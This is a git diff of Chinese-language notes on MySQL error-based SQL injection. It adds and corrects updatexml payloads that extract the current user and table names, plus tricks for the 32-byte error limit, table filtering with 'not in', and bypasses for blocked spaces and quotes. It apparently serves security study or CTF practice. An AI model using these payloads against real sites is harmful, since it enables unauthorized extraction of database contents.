@@ -34,7 +34,8 @@ https://www.cnblogs.com/c1047509362/p/12806297.html
 ref：https://www.codenong.com/cs106450896/
 
 #### 报错注入变种：无单引号版
-1. aid=(select%201%20and%201=updatexml(1,concat(0x7e,(select(user())),0x73),1))&target=1
+1. `aid=(select%201%20and%201=updatexml(1,concat(0x7e,(select(user())),0x7e),1))&target=1`
+
 
 ### 注入各种问题处理方法
 1. 提示输出信息超过一行：使用group_concat,eg:3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1
@@ -43,10 +44,11 @@ ref：https://blog.csdn.net/forwardss/article/details/104682924
 1. 替代空格：
     * 使用括号，eg：`3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1`
     * 使用内联注释：`/**/`
-1. 报错注入，返回值XPATH syntax error有长度限制，为32bytes。使用substr截取需要的部分回显`updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,32),0x73),1)`
+1. 报错注入，返回值XPATH syntax error有长度限制，为32bytes。使用substr截取需要的部分回显`updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,32),0x7e),1)`
+1. substr不能用：利用not in。`(select%201%20and%201=updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where table_schema=database() and table_name not in(0x6e657773)),0x7e),1))&target=1`，注意not in里面必须有内容，然后一点点添加不需要的表名，筛选出需要的表名。
 1. 单引号被转义为\：用0x5C替代单引号
 ref：https://www.cnblogs.com/lwfiwo/p/11314408.html
-    1. 引号绕过导致table_name='user'不能用：user转换成十六进制编码0x7573657273
+1. 引号绕过导致table_name='user'不能用：user转换成十六进制编码0x7573657273
     ref：https://blog.csdn.net/weixin_39846361/article/details/113301753
 
 ### 其它资源
